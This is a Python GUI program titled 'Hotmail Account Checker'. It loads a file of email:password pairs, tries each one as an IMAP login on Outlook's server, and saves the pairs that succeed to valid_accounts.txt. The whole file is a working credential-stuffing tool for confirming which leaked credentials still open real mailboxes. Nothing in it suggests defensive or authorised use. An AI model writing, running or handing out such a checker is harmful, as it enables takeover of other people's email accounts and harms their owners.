import tkinter as tk
from tkinter import filedialog, scrolledtext
import imaplib
import threading

class HotmailCheckerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Hotmail Account Checker")
        self.root.geometry("500x400")

        # UI Elements
        self.select_file_button = tk.Button(root, text="Select Account File", command=self.select_file)
        self.select_file_button.pack(pady=10)

        self.file_path_label = tk.Label(root, text="No file selected")
        self.file_path_label.pack(pady=5)

        self.start_button = tk.Button(root, text="Start Checking", command=self.start_checking, state=tk.DISABLED)
        self.start_button.pack(pady=10)

        self.progress_text = scrolledtext.ScrolledText(root, state='disabled', width=60, height=15)
        self.progress_text.pack(pady=10)

        self.filepath = ""

    def select_file(self):
        self.filepath = filedialog.askopenfilename(
            title="Select Account File",
            filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
        )
        if self.filepath:
            self.file_path_label.config(text=self.filepath)
            self.start_button.config(state=tk.NORMAL)
        else:
            self.file_path_label.config(text="No file selected")
            self.start_button.config(state=tk.DISABLED)

    def start_checking(self):
        self.start_button.config(state=tk.DISABLED)
        self.select_file_button.config(state=tk.DISABLED)
        self.clear_progress()
        self.update_progress("Starting...")

        thread = threading.Thread(target=self.check_accounts)
        thread.daemon = True
        thread.start()

    def check_accounts(self):
        valid_accounts = []
        try:
            with open(self.filepath, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue

                    try:
                        email, password = line.split(':', 1)
                        self.update_progress(f"Checking: {email}")

                        imap = imaplib.IMAP4_SSL("outlook.office365.com")
                        imap.login(email, password)
                        imap.logout()

                        self.update_progress(f"SUCCESS: {email}")
                        valid_accounts.append(line)
                    except imaplib.IMAP4.error as e:
                        self.update_progress(f"FAILED: {email} - {e}")
                    except ValueError:
                        self.update_progress(f"INVALID LINE: {line}")
                    except Exception as e:
                        self.update_progress(f"ERROR: {email} - {e}")

            if valid_accounts:
                with open("valid_accounts.txt", "w") as f:
                    for account in valid_accounts:
                        f.write(account + "\\n")
                self.update_progress("\\nSaved valid accounts to valid_accounts.txt")
            else:
                self.update_progress("\\nNo valid accounts found.")

        except FileNotFoundError:
            self.update_progress("Error: Input file not found.")
        finally:
            self.root.after(0, self.enable_buttons)

    def update_progress(self, message):
        def task():
            self.progress_text.config(state='normal')
            self.progress_text.insert(tk.END, message + "\\n")
            self.progress_text.config(state='disabled')
            self.progress_text.see(tk.END)
        self.root.after(0, task)

    def clear_progress(self):
        self.progress_text.config(state='normal')
        self.progress_text.delete(1.0, tk.END)
        self.progress_text.config(state='disabled')

    def enable_buttons(self):
        self.start_button.config(state=tk.NORMAL)
        self.select_file_button.config(state=tk.NORMAL)

if __name__ == "__main__":
    root = tk.Tk()
    app = HotmailCheckerApp(root)
    root.mainloop()
